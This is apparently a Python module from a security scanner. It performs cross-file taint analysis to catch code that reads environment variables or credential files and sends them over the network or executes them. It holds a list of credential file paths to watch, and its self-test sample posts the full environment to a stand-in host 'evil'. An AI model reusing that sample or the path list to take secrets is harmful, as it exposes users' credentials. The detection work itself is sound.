"""
taint.py — Cross-File Interprocedural Taint Analysis
====================================================
The capability that separates Sinkline from per-file linters: it follows a
*secret* (an environment variable or a credential file) as it is returned from a
helper in one module and exfiltrated through a network/exec sink in another —
the distributed-backdoor pattern (W4SP / TeamPCP) where no single file looks
malicious.

Design — precision first:
  * **Sources** are deliberately narrow and high-confidence: ``os.environ`` /
    ``os.getenv`` and reads of known credential files (``~/.ssh/id_rsa``,
    ``.aws/credentials``, ``.env`` …). This keeps false positives near zero.
  * **Sinks** are outbound network calls (requests/httpx/urllib/socket) and code
    execution (exec/eval/os.system/subprocess).
  * **Propagation** is interprocedural via *function summaries* plus a fixpoint:
    a function "returns taint" if it returns a source or the result of another
    taint-returning function. Calls are resolved across modules through each
    file's import map.

It only emits a finding when the taint path crosses a **function boundary**
(otherwise classic_rules already covers the single-statement case), so there are
no duplicate findings — this strictly *adds* the cross-file/-function cases.
"""
from __future__ import annotations

import ast
import os
from dataclasses import dataclass, field
from typing import Dict, FrozenSet, List, Optional, Tuple

from findings import Finding, get_meta

_CRED_PATHS = (".ssh", "id_rsa", ".aws", "credentials", ".netrc", "/etc/passwd",
               "/etc/shadow", ".env", ".npmrc", ".pypirc", ".docker/config", "token")
_NET_RECEIVERS = {"requests", "httpx", "urllib", "session", "client", "http",
                  "conn", "connection", "sock", "socket", "s", "ws", "aiohttp", "urllib3"}
_NET_METHODS = {"post", "put", "patch", "request", "send", "sendall", "sendto", "urlopen"}
_EXEC_NAMES = {"exec", "eval", "__import__"}
_EXEC_ATTRS = {"system", "popen", "run", "call", "Popen", "check_output", "check_call"}

CallRef = Tuple[Optional[str], str]  # (module_hint, function_name)


@dataclass(frozen=True)
class Taint:
    """A value's taint: directly tainted, and/or tainted iff some call returns taint.

    ``deep`` marks taint that reached a value through indirection — a container
    element, an object attribute, augmented assignment, or a mutating method —
    i.e. a flow that ``classic_rules`` does not cover, so the engine emits it
    even when it does not cross a function boundary.
    """
    direct: bool = False
    calls: FrozenSet[CallRef] = frozenset()
    deep: bool = False

    def union(self, other: "Taint") -> "Taint":
        return Taint(self.direct or other.direct, self.calls | other.calls,
                     self.deep or other.deep)

    def as_deep(self) -> "Taint":
        return Taint(self.direct, self.calls, True)


EMPTY = Taint()


@dataclass
class Summary:
    module: str
    name: str
    lineno: int
    return_taint: Taint = EMPTY
    returns_taint: bool = False               # fixpoint result
    sinks: List[Tuple[str, str, Taint, int]] = field(default_factory=list)  # kind,name,taint,line


def _attr_chain(node: ast.AST) -> str:
    parts = []
    while isinstance(node, ast.Attribute):
        parts.append(node.attr)
        node = node.value
    if isinstance(node, ast.Name):
        parts.append(node.id)
    return ".".join(reversed(parts))


def _dotted(node: ast.AST) -> Optional[str]:
    """Dotted key for a Name/Attribute place, e.g. self.creds -> 'self.creds'."""
    parts = []
    while isinstance(node, ast.Attribute):
        parts.append(node.attr)
        node = node.value
    if isinstance(node, ast.Name):
        parts.append(node.id)
        return ".".join(reversed(parts))
    return None


def _base_name(node: ast.AST) -> Optional[str]:
    """Leftmost Name id through Subscript/Attribute chains (d['k'].x -> 'd')."""
    while isinstance(node, (ast.Subscript, ast.Attribute)):
        node = node.value
    return node.id if isinstance(node, ast.Name) else None


# Container methods whose tainted argument taints the receiver.
_MUTATORS = {"append", "extend", "add", "update", "insert", "setdefault", "__setitem__"}


def _module_stem(path: str) -> str:
    base = os.path.basename(path)
    stem = os.path.splitext(base)[0]
    if stem == "__init__":
        return os.path.basename(os.path.dirname(path)) or "__init__"
    return stem


class _FileAnalyzer:
    """Builds function summaries and an import map for a single module."""

    def __init__(self, module: str, code: str):
        self.module = module
        self.tree = ast.parse(code)
        self.func_imports: Dict[str, CallRef] = {}   # name -> (module_hint, orig)
        self.module_alias: Dict[str, str] = {}       # alias -> module stem
        self.local_funcs: set = set()
        self.summaries: List[Summary] = []
        self._build_imports()
        for node in self.tree.body:
            if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)):
                self.local_funcs.add(node.name)

    def _build_imports(self):
        for node in ast.walk(self.tree):
            if isinstance(node, ast.ImportFrom):
                hint = node.module.split(".")[-1] if node.module else None
                for a in node.names:
                    self.func_imports[a.asname or a.name] = (hint, a.name)
            elif isinstance(node, ast.Import):
                for a in node.names:
                    stem = a.name.split(".")[-1]
                    self.module_alias[a.asname or stem] = stem

    def _resolve_call(self, func: ast.AST) -> Optional[CallRef]:
        if isinstance(func, ast.Name):
            if func.id in self.func_imports:
                return self.func_imports[func.id]
            if func.id in self.local_funcs:
                return (self.module, func.id)
            return (None, func.id)
        if isinstance(func, ast.Attribute) and isinstance(func.value, ast.Name):
            recv = func.value.id
            mod = self.module_alias.get(recv, recv)
            return (mod, func.attr)
        return None

    # --- taint of an expression -----------------------------------------
    def _expr_taint(self, node: ast.AST, tv: Dict[str, Taint]) -> Taint:
        if node is None:
            return EMPTY
        if isinstance(node, ast.Call):
            chain = _attr_chain(node.func)
            parts = chain.split(".")
            if "environ" in parts or "getenv" in parts:
                return Taint(direct=True)
            if (chain == "open" or chain.endswith(".open")) and node.args \
                    and isinstance(node.args[0], ast.Constant) \
                    and isinstance(node.args[0].value, str) \
                    and any(p in node.args[0].value for p in _CRED_PATHS):
                return Taint(direct=True)
            ref = self._resolve_call(node.func)
            t = Taint(calls=frozenset([ref])) if ref else EMPTY
            # Method-call receiver carries taint: open(cred).read(), x.decode() …
            if isinstance(node.func, ast.Attribute):
                t = t.union(self._expr_taint(node.func.value, tv))
            for a in node.args:
                t = t.union(self._expr_taint(a, tv))
            for k in node.keywords:
                t = t.union(self._expr_taint(k.value, tv))
            return t
        if isinstance(node, ast.Attribute):
            if _attr_chain(node).endswith(".environ"):
                return Taint(direct=True)
            place = _dotted(node)
            if place and place in tv:           # precise attribute taint (self.creds)
                return tv[place]
            return self._expr_taint(node.value, tv)   # else fall back to receiver taint
        if isinstance(node, ast.Name):
            return tv.get(node.id, EMPTY)
        if isinstance(node, (ast.BinOp,)):
            return self._expr_taint(node.left, tv).union(self._expr_taint(node.right, tv))
        if isinstance(node, ast.JoinedStr):
            t = EMPTY
            for v in node.values:
                if isinstance(v, ast.FormattedValue):
                    t = t.union(self._expr_taint(v.value, tv))
            return t
        if isinstance(node, (ast.List, ast.Tuple, ast.Set)):
            t = EMPTY
            for e in node.elts:
                t = t.union(self._expr_taint(e, tv))
            return t
        if isinstance(node, ast.Dict):
            t = EMPTY
            for v in node.values:
                t = t.union(self._expr_taint(v, tv))
            return t
        if isinstance(node, ast.Subscript):
            return self._expr_taint(node.value, tv)
        return EMPTY

    def _sink_kind(self, node: ast.Call) -> Optional[Tuple[str, str]]:
        """Return (kind, display) if this call is a network/exec sink."""
        f = node.func
        if isinstance(f, ast.Name):
            if f.id in _EXEC_NAMES:
                return ("exec", f.id)
            return None
        if isinstance(f, ast.Attribute):
            attr = f.attr
            chain = _attr_chain(f)
            if attr in _NET_METHODS:
                root = chain.split(".")[0]
                if root in _NET_RECEIVERS or attr in {"post", "put", "patch", "request",
                                                       "send", "sendall", "urlopen"}:
                    return ("network", chain)
            if attr in _EXEC_ATTRS:
                root = chain.split(".")[0]
                if root in {"os", "subprocess"}:
                    return ("exec", chain)
        return None

    def analyze(self) -> List[Summary]:
        for node in self.tree.body:
            if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)):
                self.summaries.append(self._analyze_func(node))
            elif isinstance(node, ast.ClassDef):
                self_taint = self._class_self_taint(node)
                for m in node.body:
                    if isinstance(m, (ast.FunctionDef, ast.AsyncFunctionDef)):
                        self.summaries.append(self._analyze_func(m, self_taint))
        return self.summaries

    def _class_self_taint(self, cls: ast.ClassDef) -> Dict[str, Taint]:
        """Find `self.<attr> = <secret>` across a class's methods (cross-method state).

        Evaluated with no locals, so it captures direct sources (os.environ,
        credential files) and taint-returning calls — not locals-derived values —
        keeping precision high.
        """
        out: Dict[str, Taint] = {}
        for m in cls.body:
            if not isinstance(m, (ast.FunctionDef, ast.AsyncFunctionDef)):
                continue
            for stmt in ast.walk(m):
                if isinstance(stmt, ast.Assign):
                    for tgt in stmt.targets:
                        place = _dotted(tgt)
                        if place and place.startswith("self."):
                            t = self._expr_taint(stmt.value, {})
                            if t.direct or t.calls:
                                out[place] = out.get(place, EMPTY).union(t)
        return out

    def _analyze_func(self, fn, self_taint: Optional[Dict[str, Taint]] = None) -> Summary:
        s = Summary(module=self.module, name=fn.name, lineno=fn.lineno)
        # Cross-method self state is read indirectly -> mark it deep.
        tv: Dict[str, Taint] = {k: v.as_deep() for k, v in self_taint.items()} if self_taint else {}

        def taint_place(target: ast.AST, t: Taint, force_deep: bool):
            """Record taint for an assignment/mutation target (var, attr, or container)."""
            if force_deep:
                t = t.as_deep()
            if isinstance(target, ast.Name):
                tv[target.id] = tv.get(target.id, EMPTY).union(t)
            elif isinstance(target, ast.Attribute):
                place = _dotted(target)
                if place:
                    tv[place] = tv.get(place, EMPTY).union(t)
            elif isinstance(target, ast.Subscript):
                base = _base_name(target)        # coarse: a container holding a secret is tainted
                if base:
                    tv[base] = tv.get(base, EMPTY).union(t)

        for stmt in ast.walk(fn):
            if isinstance(stmt, ast.Assign):
                t = self._expr_taint(stmt.value, tv)
                if t.direct or t.calls:
                    for tgt in stmt.targets:
                        # Plain `x = secret` is covered by classic_rules (not deep);
                        # attribute/container targets are indirection (deep).
                        taint_place(tgt, t, force_deep=not isinstance(tgt, ast.Name))
            elif isinstance(stmt, ast.AugAssign):     # buf += secret  (indirection)
                t = self._expr_taint(stmt.value, tv)
                if t.direct or t.calls:
                    taint_place(stmt.target, t, force_deep=True)
            elif isinstance(stmt, ast.Return) and stmt.value is not None:
                s.return_taint = s.return_taint.union(self._expr_taint(stmt.value, tv))
            elif isinstance(stmt, ast.Call):
                f = stmt.func
                # Mutating container method: items.append(secret) taints `items`.
                if isinstance(f, ast.Attribute) and f.attr in _MUTATORS:
                    argt = EMPTY
                    for a in stmt.args:
                        argt = argt.union(self._expr_taint(a, tv))
                    for k in stmt.keywords:
                        argt = argt.union(self._expr_taint(k.value, tv))
                    if argt.direct or argt.calls:
                        taint_place(f.value, argt, force_deep=True)
                kind = self._sink_kind(stmt)
                if kind is not None:
                    argt = EMPTY
                    for a in stmt.args:
                        argt = argt.union(self._expr_taint(a, tv))
                    for k in stmt.keywords:
                        argt = argt.union(self._expr_taint(k.value, tv))
                    if argt.direct or argt.calls:
                        s.sinks.append((kind[0], kind[1], argt, getattr(stmt, "lineno", fn.lineno)))
        return s


def _resolve_summary(ref: CallRef, by_qual, by_name) -> Optional[Summary]:
    hint, name = ref
    if hint is not None and (hint, name) in by_qual:
        return by_qual[(hint, name)]
    cands = by_name.get(name, [])
    if len(cands) == 1:
        return cands[0]
    # ambiguous or unknown
    return None


def analyze_package(files: Dict[str, str]) -> List[Finding]:
    """Run cross-file taint over a set of {path: code}; return cross-boundary findings."""
    analyzers: Dict[str, _FileAnalyzer] = {}
    all_summaries: List[Tuple[str, Summary]] = []  # (path, summary)
    for path, code in files.items():
        try:
            fa = _FileAnalyzer(_module_stem(path), code)
            fa.analyze()
        except SyntaxError:
            continue
        analyzers[path] = fa
        for s in fa.summaries:
            all_summaries.append((path, s))

    by_qual: Dict[Tuple[str, str], Summary] = {}
    by_name: Dict[str, List[Summary]] = {}
    for _, s in all_summaries:
        by_qual[(s.module, s.name)] = s
        by_name.setdefault(s.name, []).append(s)

    def eval_taint(t: Taint) -> bool:
        if t.direct:
            return True
        return any((r := _resolve_summary(ref, by_qual, by_name)) and r.returns_taint
                   for ref in t.calls)

    # Fixpoint: propagate returns_taint across modules.
    for _ in range(len(all_summaries) + 1):
        changed = False
        for _, s in all_summaries:
            nv = eval_taint(s.return_taint)
            if nv != s.returns_taint:
                s.returns_taint = nv
                changed = True
        if not changed:
            break

    findings: List[Finding] = []
    for path, s in all_summaries:
        for kind, sink_name, taint, line in s.sinks:
            # Emit when the flow crosses a function boundary (a taint-returning
            # call) OR reaches the sink through indirection — a container /
            # attribute / augmented-assignment / mutating method (``deep``).
            # The trivial single-statement case is left to classic_rules.
            crossing = [r for r in taint.calls
                        if (rs := _resolve_summary(r, by_qual, by_name)) and rs.returns_taint]
            if not crossing and not taint.deep:
                continue
            if crossing:
                src = _resolve_summary(crossing[0], by_qual, by_name)
                src_loc = f"{src.module}.{src.name}()" if src else "helper()"
                why = f"secret returned by {src_loc} reaches {kind} sink {sink_name}()"
            else:
                why = (f"secret stored via a container/attribute reaches "
                       f"{kind} sink {sink_name}()")
            rule = "CREDENTIAL_EXFILTRATION" if kind == "network" else "COMMAND_INJECTION"
            meta = get_meta(rule)
            f = Finding(
                pattern=rule, meta=meta, confidence="High",
                risk_score=0.9, line=line, column=1,
                snippet=sink_name,
                evidence=[("cross-file taint: " if crossing else "taint flow: ") + why + " here"],
            )
            f.artifact_uri = path
            findings.append(f)
    return findings


if __name__ == "__main__":
    pkg = {
        "utils.py": "import os\ndef collect():\n    return os.environ.copy()\n",
        "client.py": "import requests\nfrom utils import collect\n"
                     "def beacon():\n    requests.post('https://evil/c', data=collect())\n",
        "safe.py": "import requests\ndef ping():\n    requests.get('https://api/health')\n",
    }
    for f in analyze_package(pkg):
        print(f"[{f.severity}/{f.confidence}] {f.meta.cwe} {f.meta.title} "
              f"@ {f.artifact_uri}:{f.line} — {f.evidence[0]}")
